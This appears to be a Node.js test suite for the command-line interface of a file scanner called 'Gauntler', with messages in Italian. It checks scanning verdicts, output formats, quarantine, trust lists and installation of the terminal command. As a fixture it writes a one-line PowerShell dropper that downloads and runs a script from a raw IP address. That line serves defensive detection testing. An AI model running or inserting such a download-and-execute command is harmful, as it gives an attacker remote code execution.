// Creato da anvex2012
'use strict';
/* Tests for the terminal commands (isolated environment via GAUNTLER_HOME) */
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');

const home = fs.mkdtempSync(path.join(os.tmpdir(), 'gauntler-home-'));
const work = fs.mkdtempSync(path.join(os.tmpdir(), 'gauntler-cli-'));
const CLI = path.join(__dirname, '..', 'cli', 'gauntler.js');
const env = { ...process.env, GAUNTLER_HOME: home, NO_COLOR: '1' };
const run = (args, input) => spawnSync(process.execPath, [CLI, ...args], { env, input, encoding: 'utf8', cwd: work, timeout: 120000 });

const bad = 'IEX (New-Object Net.WebClient).DownloadString("http://185.1.2.3/a.ps1")\n';
fs.writeFileSync(path.join(work, 'dropper.ps1'), bad);
fs.writeFileSync(path.join(work, 'nota.txt'), 'lista della spesa: pane, latte\n');
fs.mkdirSync(path.join(work, 'node_modules'));
fs.writeFileSync(path.join(work, 'node_modules', 'x.ps1'), bad);

let fail = 0;
const check = (name, cond, extra = '') => { console.log(`${cond ? '✔' : '✘'} ${name}${cond ? '' : '  ' + extra}`); if (!cond) fail++; };

let r = run(['--help']);
check('help', r.status === 0 && /Comandi/.test(r.stdout));
r = run(['--version']);
check('version', /^\d+\.\d+\.\d+/.test(r.stdout));
r = run(['dropper.ps1', '-q']);
check('scan file pericoloso → exit 1', r.status === 1 && /Pericoloso/.test(r.stdout), r.stdout + r.stderr);
r = run(['nota.txt', '-q']);
check('scan file pulito → exit 0', r.status === 0 && /Sicuro/.test(r.stdout), r.stdout + r.stderr);
r = run(['.', '-q', '-x', '**/node_modules/**']);
check('cartella con esclusione', !/node_modules/.test(r.stdout) && /dropper/.test(r.stdout), r.stdout);
r = run(['-', '--name', 'x.ps1', '-q'], bad);
check('stdin', r.status === 1 && /x\.ps1/.test(r.stdout), r.stdout + r.stderr);
r = run(['dropper.ps1', '-f', 'json']);
let j; try { j = JSON.parse(r.stdout); } catch { j = null; }
check('formato json', j && j.overall && j.overall.score < 40 && j.source === undefined);
r = run(['.', '-f', 'sarif', '-x', '**/node_modules/**']);
try { j = JSON.parse(r.stdout); } catch { j = null; }
check('formato sarif', j && j.version === '2.1.0' && j.runs[0].results.length > 0 && j.runs[0].results.some((x) => x.locations[0].physicalLocation.region?.startLine === 1));
r = run(['.', '-o', 'report.csv', '-x', '**/node_modules/**']);
check('--out con formato dedotto (csv)', fs.existsSync(path.join(work, 'report.csv')) && /^file,sha256/.test(fs.readFileSync(path.join(work, 'report.csv'), 'utf8')));
r = run(['dropper.ps1', '-q', '--fail-on', 'high', '--threshold', '1']);
check('--fail-on high → exit 1', r.status === 1);
r = run(['nota.txt', '--only', 'nonesiste']);
check('criterio sconosciuto → exit 2', r.status === 2);
r = run(['dropper.ps1', '-q']);
check('cache al secondo giro', /\(cache\)/.test(r.stdout), r.stdout);
r = run(['dropper.ps1', '--ids']);
const id = (r.stdout.match(/id: (signatures:\S+)/) || [])[1];
check('id delle segnalazioni', !!id);
run(['ignore', 'signatures:*']);
r = run(['dropper.ps1', '-f', 'json']);
j = JSON.parse(r.stdout);
check('ignore (suppress)', !j.findings.some((f) => f.categoryId === 'signatures') && j.suppressed.length > 0);
run(['ignore', '--remove', 'signatures:*']);
run(['trust', 'dropper.ps1']);
r = run(['dropper.ps1', '-q']);
check('trust (allowlist) → 100', /100\/100\s+Attendibile/.test(r.stdout) && r.status === 0, r.stdout);
run(['trust', '--remove', 'dropper.ps1']);
r = run(['config', 'set', 'threshold', '20']);
check('config set', r.status === 0 && JSON.parse(fs.readFileSync(path.join(home, 'config.json'), 'utf8')).threshold === 20);
r = run(['config', 'set', 'chiaveinesistente', '1']);
check('config chiave non valida → errore', r.status === 3 || r.status === 2);
fs.copyFileSync(path.join(work, 'dropper.ps1'), path.join(work, 'q.ps1'));
r = run(['q.ps1', '-q', '--quarantine', '--quarantine-below', '50']);
check('scan --quarantine', !fs.existsSync(path.join(work, 'q.ps1')) && /quarantena/.test(r.stdout), r.stdout + r.stderr);
r = run(['quarantine', 'list', '--json']);
const ql = JSON.parse(r.stdout);
check('quarantine list', ql.length === 1);
r = run(['quarantine', 'restore', ql[0].id.slice(0, 12)]);
check('quarantine restore', fs.readFileSync(path.join(work, 'q.ps1'), 'utf8') === bad, r.stdout + r.stderr);
r = run(['history', '--json', '-n', '100']);
check('history', JSON.parse(r.stdout).length >= 5);
r = run(['hash', 'nota.txt', '--json']);
check('hash', /^[a-f0-9]{64}$/.test(JSON.parse(r.stdout).sha256));
r = run(['rules', 'tokens', '--json']);
check('rules', JSON.parse(r.stdout).length > 150);
r = run(['doctor']);
check('doctor', r.status === 0 && /Motore Gauntler/.test(r.stdout));
r = run(['completion', 'bash']);
check('completion', /complete -o filenames/.test(r.stdout));
r = run(['comandoinesistente']);
check('comando sconosciuto → exit 2', r.status === 2);

// Terminal command: install into a temporary folder, run it, refuse foreign files, remove it
{
  const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'gauntler-bin-'));
  r = run(['install-command', '--dir', bin]);
  const launcher = path.join(bin, 'gauntler');
  check('install-command crea il comando eseguibile', r.status === 0 && fs.existsSync(launcher) && (fs.statSync(launcher).mode & 0o111) !== 0, r.stdout + r.stderr);
  const sh = spawnSync(launcher, ['--version'], { env: { ...env, GAUNTLER_APP: '' }, encoding: 'utf8', timeout: 60000 });
  check('il comando installato funziona (gauntler --version)', sh.status === 0 && /^\d+\.\d+\.\d+/.test(sh.stdout), sh.stdout + sh.stderr);
  const sc = spawnSync(launcher, [path.join(work, 'dropper.ps1'), '-q', '--threshold', '40'], { env: { ...env, GAUNTLER_APP: '' }, encoding: 'utf8', timeout: 120000 });
  check('il comando installato analizza un file', sc.status === 1 && /Pericoloso/.test(sc.stdout), `status=${sc.status} signal=${sc.signal} ${sc.error || ''} ` + sc.stdout + sc.stderr);
  r = run(['install-command', '--dir', bin]);
  check('reinstallazione → aggiorna senza errori', r.status === 0, r.stderr);
  r = run(['uninstall-command', '--dir', bin]);
  check('uninstall-command rimuove il comando', r.status === 0 && !fs.existsSync(launcher), r.stdout + r.stderr);
  fs.writeFileSync(launcher, '#!/bin/sh\necho altro programma\n');
  r = run(['install-command', '--dir', bin]);
  check('un file "gauntler" estraneo non viene sovrascritto', r.status !== 0 && /non lo sovrascrivo/.test(r.stderr) && /altro programma/.test(fs.readFileSync(launcher, 'utf8')), r.stdout + r.stderr);
  r = run(['uninstall-command', '--dir', bin]);
  check('… né rimosso', r.status !== 0 && fs.existsSync(launcher), r.stdout + r.stderr);
  r = run(['app', path.join(work, 'non-esiste.txt')]);
  check('gauntler app con file inesistente → errore chiaro', r.status === 2 && /Non trovato/.test(r.stderr), r.stdout + r.stderr);
  fs.rmSync(bin, { recursive: true, force: true });
}

fs.rmSync(home, { recursive: true, force: true });
fs.rmSync(work, { recursive: true, force: true });
console.log(fail ? `\n${fail} test CLI falliti` : '\nTutti i test CLI superati');
process.exit(fail ? 1 : 0);
